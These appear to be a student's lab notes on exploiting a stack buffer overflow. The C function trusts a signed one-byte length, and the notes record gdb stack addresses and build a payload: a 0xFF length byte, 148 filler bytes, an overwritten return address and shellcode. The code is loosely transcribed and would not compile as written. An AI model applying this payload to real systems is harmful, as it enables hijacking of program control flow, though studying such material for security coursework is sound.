
void display(const char * path) {
    char msg[128]
    int8_t size  # exactly 8 bits in syze
    memset(msg, 0, 128)

    FILE * file = fopen(path, "r")
    if (!file) {
        perror("fopen")
        return
    }
    size_t bytes_read = fread( & size, 1, 1, file)
    if (bytes_read == 0 | | size > 128)
    return
    bytes_read = fread(msg, 1, size, file)

    puts(msg)
}


int main(int argc, char * argv[])
{
    if (argc != 2)
    return 1

    display(argv[1])
    return 0
}


[4] RIP display
[4] SFP display
[N] Compiler Padding
[128] msg'A'
[1] size

[?] memset - just fills the msg with '0s'?
[4] - fopen

# Bytes in difference is 148 which is 0x94 in hex

# Expects file to be specially formatted
# First byte of the file specidies its length, followed by the actual file
# Also does a check to make the buffer isnt too large

# \x78\x56\x34\x12


# To do debudding run .\debug-exploit and then 'layout split'
# x/16x buf , gets the addresses at buf. 16 bytes from buf and working our way upwards
# info frame, get rip and sfp -> the sfp is the saved & rip is the saved eip

# nano egg and make a print function

# address at msg = 0xffffd598
# address at rip = 0xffffd62c
# Value at eip = 0x80492bd
# address at sfp = 0xffffd628


# address +4 = FF FF D6 30

# print("\xFF"+"A"*148+"\x30\xd6\xff\xff"+SHELLCODE)

print("\xFF"+"A"*148+"\x30\xd6\xff\xff"+SHELLCODE)